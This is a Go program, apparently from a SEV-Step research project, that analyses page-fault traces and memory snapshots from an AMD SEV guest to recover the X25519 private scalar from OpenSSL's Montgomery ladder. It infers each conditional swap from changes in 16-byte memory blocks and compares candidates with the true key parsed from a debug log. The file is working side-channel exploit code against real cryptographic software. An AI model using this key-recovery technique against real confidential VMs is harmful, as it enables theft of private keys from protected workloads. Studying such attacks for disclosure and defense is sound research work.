package main

import (
	"bufio"
	"bytes"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"pfFingerprint"
	"strings"

	"github.com/agnivade/levenshtein"

	"github.com/UzL-ITS/sev-step/sevStep"
)

func main() {

	configIn := flag.String("configIn", "attack-config.json", "Path to config file")
	in := flag.String("in", "attack-log.txt", "Path to trace file")
	specificOffset := flag.Uint("specificOffset", 0, "If set, only that offset is considered for key recovery")
	debugLog := flag.Bool("debugLog", false, "Enable additional prints for debbuging")
	showAllCandidates := flag.Bool("showAllCandidates", false, "Show all key candidates")

	flag.Parse()

	//
	//handles flags
	//

	rawConfig, err := ioutil.ReadFile(*configIn)
	if err != nil {
		log.Printf("failed to read config file : %v", err)
		return
	}
	attackConfig := &pfFingerprint.OSSLAttackConfigECDH{}
	if err := json.Unmarshal(rawConfig, attackConfig); err != nil {
		log.Printf("failed to parse config file : %v", err)
		return
	}

	log.Printf("Attack Config: BaseGPA %x, Fe64GPA %x, StackGPA %x\n", attackConfig.BaseGPA, attackConfig.Fe64GPA, attackConfig.StackBufGPA)

	inFile, err := os.Open(*in)
	if err != nil {
		log.Printf("failed to open input file :%v\n", err)
		return
	}
	defer inFile.Close()
	inReader := bufio.NewReader(inFile)

	events, err := sevStep.ParseInputFile(inReader)
	if err != nil {
		log.Printf("failed to parse input file %v", err)
		return
	}

	//
	// main logic
	//

	fmt.Printf("Got %v events\n", len(events))

	//discard events before second fe64 gpa hit
	idx := len(events)
	hitCount := 0
	for i, v := range events {
		if v.FaultedGPA == attackConfig.Fe64GPA {
			hitCount++
			if hitCount >= 2 {
				idx = i
				break
			}
		}
	}
	log.Printf("Discarding the following events\n")
	for _, v := range events[:idx] {
		log.Printf("%s\n", v)
	}
	//discardedEventsAtFront := idx
	events = events[idx:]

	fmt.Printf("Events after removing entries before fe64 gpa: %v\n", len(events))

	//algo: print mem at first fe64 page event and 18 main page events after that
	eventsOnFe64Page := sevStep.FilterEvents(events, func(e *sevStep.Event) bool {
		return sevStep.OnSamePage(e.FaultedGPA, attackConfig.Fe64GPA)
	})
	eventsOnBasePage := sevStep.FilterEvents(events, func(e *sevStep.Event) bool {
		return sevStep.OnSamePage(e.FaultedGPA, attackConfig.BaseGPA)
	})
	if *debugLog {
		const count = 40
		log.Printf("First %v events on base page : \n", count)
		for _, v := range eventsOnBasePage[:count] {
			log.Printf("RIP %x\n", v.RIP)
		}
	}

	const fe64IDXInit = 18
	const fe64Delta = 18

	const baseIDXInit = 0
	const baseDeltaA = 17
	const baseDeltaB = 1

	const unknownHighBits = 1 //1 because we do not observe the swap in the first loop iteration
	const mainLoopIterations = 255

	//
	//determine 16 aligned memory blocks in monitored page that change
	//Each location gives us a key candidate
	//

	fe64PageIDX := fe64IDXInit
	basePageIDX := baseIDXInit
	offsetsWithChange := make(map[int]bool)
	for i := mainLoopIterations - 1 - unknownHighBits; i >= 0; i-- {
		basePageIDX += baseDeltaA
		if basePageIDX >= len(eventsOnBasePage) {
			log.Fatalf("at secretBit %v, basePageIDX %v would be out of bounds", i, basePageIDX)
		}
		if !eventsOnBasePage[basePageIDX].HasAccessData() {
			log.Fatalf("basePageIDX does %v does not have access data", basePageIDX)
		}
		memBeforeCSwap := eventsOnBasePage[basePageIDX].Content

		if fe64PageIDX >= len(eventsOnFe64Page) {
			log.Fatalf("at secretBit %v, fe64PageIDX %v would be out of bounds", i, fe64PageIDX)
		}
		if !eventsOnFe64Page[fe64PageIDX].HasAccessData() {
			log.Fatalf("fe64PageIDX does %v does not have access data", basePageIDX)
		}

		memAfterCSwap := eventsOnFe64Page[fe64PageIDX].Content

		for _, v := range aesBLockAlignedOffsetsWithChange(memBeforeCSwap, memAfterCSwap) {
			offsetsWithChange[v] = true
		}

		//prepare next iteration
		basePageIDX += baseDeltaB
		fe64PageIDX += fe64Delta
	}

	if *specificOffset != 0 && !offsetsWithChange[int(*specificOffset)] {
		log.Printf("Memory page show no changes at offset %03x in the snasphots. Cannot recover key!\n", *specificOffset)
		return
	} else if *specificOffset != 0 {
		log.Printf("Restricting search to offset %03x\n", *specificOffset)
		offsetsWithChange = map[int]bool{int(*specificOffset): true}
	}

	log.Printf("Compute %v key candidates\n", len(offsetsWithChange))

	//
	//recover swap sequences by observing memory changes
	//

	recoveredSwapSequences := make(map[int][]byte)
	for memOffset, doesChange := range offsetsWithChange {
		if !doesChange {
			continue
		}
		recoveredSwapSequences[memOffset] = make([]byte, mainLoopIterations)

		fe64PageIDX = fe64IDXInit
		basePageIDX = baseIDXInit
		for swapSequenceBitIDX := mainLoopIterations - 1 - unknownHighBits; swapSequenceBitIDX >= 0; swapSequenceBitIDX-- {
			basePageIDX += baseDeltaA
			if basePageIDX >= len(eventsOnBasePage) {
				log.Fatalf("at secretBit %v, basePageIDX %v would be out of bounds", swapSequenceBitIDX, basePageIDX)
			}
			if !eventsOnBasePage[basePageIDX].HasAccessData() {
				log.Fatalf("basePageIDX does %v does not have access data", basePageIDX)
			}
			memBeforeCSwap := eventsOnBasePage[basePageIDX].Content

			if fe64PageIDX >= len(eventsOnFe64Page) {
				log.Fatalf("at secretBit %v, fe64PageIDX %v would be out of bounds", swapSequenceBitIDX, fe64PageIDX)
			}
			if !eventsOnFe64Page[fe64PageIDX].HasAccessData() {
				log.Fatalf("fe64PageIDX does %v does not have access data", basePageIDX)
			}

			memAfterCSwap := eventsOnFe64Page[fe64PageIDX].Content

			if *debugLog {
				log.Printf("Mem before Cswap : %x\n", memBeforeCSwap[memOffset:memOffset+16])
				log.Printf("Rip at before    : %x\n", eventsOnBasePage[basePageIDX].RIP)
				log.Printf("Mem after  Cswap : %x\n", memAfterCSwap[memOffset:memOffset+16])
				log.Printf("Rip at after     : %x\n", eventsOnFe64Page[fe64PageIDX].RIP)
			}

			if bytes.Equal(memBeforeCSwap[memOffset:memOffset+16], memAfterCSwap[memOffset:memOffset+16]) {
				//log.Printf("swapSequenceBitIDX %v : no swap", swapSequenceBitIDX)
				recoveredSwapSequences[memOffset][swapSequenceBitIDX] = 0
			} else {
				//log.Printf("swapSequenceBitIDX %v : swap", swapSequenceBitIDX)
				recoveredSwapSequences[memOffset][swapSequenceBitIDX] = 1
			}

			//prepare next iteration
			basePageIDX += baseDeltaB
			fe64PageIDX += fe64Delta
		}

	}

	//parse correct swapSequence from debug log and compare it with the recovered scalars

	inFile.Close()
	inFile, err = os.Open(*in)
	if err != nil {
		log.Printf("failed to open input file :%v\n", err)
		return
	}
	inReader = bufio.NewReader(inFile)
	correctSecret, err := parseSecretFromOpensslLog2(inReader)
	if err != nil {
		log.Printf("Failed to parse correct swapSequence from log : %v", err)
		return
	}
	if got, want := len(correctSecret), mainLoopIterations+1; got != want {
		log.Printf("Expected parsed swapSequence from log to be %v bits but got %v\n", want, got)
	}

	correctScalar, err := x25519KeyToScalar(correctSecret)
	if err != nil {
		log.Printf("Failed to convert correct swapSequence to scalar : %v", err)
	}

	//convert recovered swap sequences to scalar and compare with correct scalar (recovered from debug log)

	fmt.Printf("Scalar candidates\n")
	foundSecret := false
	for offset, swapSequence := range recoveredSwapSequences {
		//as we do not observe the swap for 254, we have to guess it
		for bit254Guess := byte(0); bit254Guess <= 1; bit254Guess++ {
			swapSequence[254] = bit254Guess
			recoveredScalar, err := recoverScalarFromX25519Swaps(swapSequence)
			if err != nil {
				log.Printf("Failed to convert swap sequence to secret : %v", err)
				continue
			}

			abortAfter := 5
			hadError := false
			for i := 0; i < mainLoopIterations-unknownHighBits; i++ {
				if recoveredScalar[i] != correctScalar[i] {
					//fmt.Printf("\tSecret Mismatch at idx %v, wanted %v, got %v\n", i, correctSecret[i], swapSequence[i])
					abortAfter--
					hadError = true
				}
				if abortAfter <= 0 {
					//fmt.Printf("\tAborting comparison due to high error count\n")
					break
				}

			}

			if *debugLog || *showAllCandidates || !hadError {
				fmt.Printf("offset in page = %03x, guess for bit 254 = %v correct? = %v recoveredScalar = %v\n", offset, bit254Guess, !hadError, recoveredScalar)
				recoveredScalarAsStr := strings.ReplaceAll(strings.Trim(fmt.Sprintf("%s", recoveredScalar), "[]"), " ", "")
				correctScalarAsStr := strings.ReplaceAll(strings.Trim(fmt.Sprintf("%s", correctScalar), "[]"), " ", "")
				log.Printf("Levenstein to correct scalar is %v\n\n", levenshtein.ComputeDistance(recoveredScalarAsStr, correctScalarAsStr))
			}
			if !hadError {
				foundSecret = true
			}
		}
	}
	fmt.Printf("Found Correct Scalar?: %v\n", foundSecret)
	if !foundSecret {
		fmt.Printf("Correct Scalar is %v\n", correctScalar)
	}

}

func aesBLockAlignedOffsetsWithChange(a, b []byte) []int {
	offsetsWithChange := make([]int, 0)
	xorBuf := make([]byte, len(a))
	for i := range a {
		xorBuf[i] = a[i] ^ b[i]
	}
	var block []byte
	for i := 0; i < len(a); i += 16 {
		block = xorBuf[i : i+16]
		blockEmpty := true
		for j := range block {
			if block[j] != 0 {
				blockEmpty = false
				break
			}
		}
		if !blockEmpty {
			offsetsWithChange = append(offsetsWithChange, i)
		}
	}
	return offsetsWithChange
}

func printPage(buf []byte) {
	fmt.Printf("\nBeginPage\n")
	var block []byte
	for i := 0; i < len(buf); i += 16 {
		block = buf[i : i+16]
		blockEmpty := true
		for j := range block {
			if block[j] != 0 {
				blockEmpty = false
				break
			}
		}
		if !blockEmpty {
			fmt.Printf("Offset %03x: %x\n", i, block)
		}
	}
	fmt.Printf("\nEndPage\n")

}

func parseSecretFromOpensslLog(r io.Reader, secretBitLength int) ([]byte, error) {
	sc := bufio.NewScanner(r)
	sc.Split(bufio.ScanLines)
	secret := make([]byte, secretBitLength)
	secretIDX := secretBitLength - 1

	for sc.Scan() && secretIDX >= 0 {
		line := sc.Text()
		if !strings.HasPrefix(line, "swap = ") {
			continue
		}

		tokens := strings.Split(line, " ")
		const expectedTokens = 3
		if len(tokens) != expectedTokens {
			return nil, fmt.Errorf("swap entry with %v instad of %v tokens", len(tokens), expectedTokens)
		}
		switch tokens[2] {
		case "1":
			secret[secretIDX] = 1
		case "0":
			secret[secretIDX] = 0
		default:
			return nil, fmt.Errorf("swap entry has invalid value %v", tokens[2])
		}
		secretIDX--
	}
	if err := sc.Err(); err != nil {
		return nil, fmt.Errorf("scanner error : %v", err)
	}

	return secret, nil
}

//parseSecretFromOpensslLog2 scans r for a line like "secretFromOpenSSL 90:F0:F5:60:CB:57:DF:AB:37:1C:D3:0B:50:7F:16:D9:F3:94:27:60:6D:61:EC:61:AB:4F:4E:B2:D2:63:B4:53"
//and returns a slice where each entry is a key bit
func parseSecretFromOpensslLog2(r io.Reader) ([]byte, error) {
	sc := bufio.NewScanner(r)
	sc.Split(bufio.ScanLines)
	openSSLSecretString := ""
	for sc.Scan() {
		line := sc.Text()
		if !strings.HasPrefix(line, "secretFromOpenSSL") {
			continue
		}

		tokens := strings.Split(line, " ")
		const expectedTokens = 2
		if len(tokens) != expectedTokens {
			return nil, fmt.Errorf("swap entry with %v instad of %v tokens", len(tokens), expectedTokens)
		}
		openSSLSecretString = tokens[1]
	}
	if err := sc.Err(); err != nil {
		return nil, fmt.Errorf("scanner error : %v", err)
	}

	if openSSLSecretString == "" {
		return nil, fmt.Errorf("did not find \"secretFromOpenSSL\" marker")
	}

	openSSLSecretString = strings.ReplaceAll(openSSLSecretString, ":", "")

	secret, err := hex.DecodeString(openSSLSecretString)
	if err != nil {
		return nil, fmt.Errorf("failed decode secret as hex string : %v", err)
	}

	secretAsBits := make([]byte, 0)
	for _, byteValue := range secret {
		for bitIDX := 0; bitIDX < 8; bitIDX++ {
			if byteValue&(0x1<<bitIDX) != 0 {
				secretAsBits = append(secretAsBits, 1)
			} else {
				secretAsBits = append(secretAsBits, 0)

			}
		}
	}

	return secretAsBits, nil
}

//recoverScalarFromX25519Swaps takes a 255 bit swapSequence as one bit per entry
//and recovers the scalar used in the montgomery ladder multiplication in openssl
//crypto/ec/curve25519.c line 266
//Returns the 256 bits of the scalar used in the montgomery multiplication. Compare with
//x25519KeyToScalar(secret) not with the raw secret!
//
//Note: swapSequence[0] is the swap done for "pos = 0" in the attacked code snippet
//(the attacked loop runs from pos=254 down to pos=0)
func recoverScalarFromX25519Swaps(swapSequenceBits []byte) ([]byte, error) {
	const wantLen = 255
	if len(swapSequenceBits) != wantLen {
		return nil, fmt.Errorf("swapSequenceBits must have length %v, got %v", wantLen, len(swapSequenceBits))
	}
	recoveredSecret := make([]byte, 256)
	//recoveredSecret[255] is not recoverable from swap, sequence, but we know it is always zero
	//due to the applied masks
	recoveredSecret[255] = 0
	recoveredSecret[254] = swapSequenceBits[254]

	for i := 253; i >= 0; i-- {
		prev := recoveredSecret[i+1]
		currentSwap := swapSequenceBits[i]
		recoveredSecret[i] = prev ^ currentSwap
	}

	return recoveredSecret, nil
}

//x25519KeyToScalar takes 256 bit secret as one bit per slice entry and returns the corresponding
//256 bit scalar for the montgomery multiplication as bits
func x25519KeyToScalar(secretBits []byte) ([]byte, error) {
	const wantLen = 256
	if len(secretBits) != wantLen {
		return nil, fmt.Errorf("secretBits must have length %v, got %v", wantLen, len(secretBits))
	}
	scalar := make([]byte, wantLen)
	copy(scalar, secretBits)

	//magic value changes from openssl code
	//see crypto/ec/curve25519.c line 277 ff in openssl

	//lowest byte &= 0xf8
	scalar[0] = 0
	scalar[1] = 0
	scalar[2] = 0

	//highest byte &= 0x7f
	scalar[255] = 0

	//highest byte |= 0x40
	scalar[254] = 1

	return scalar, nil
}
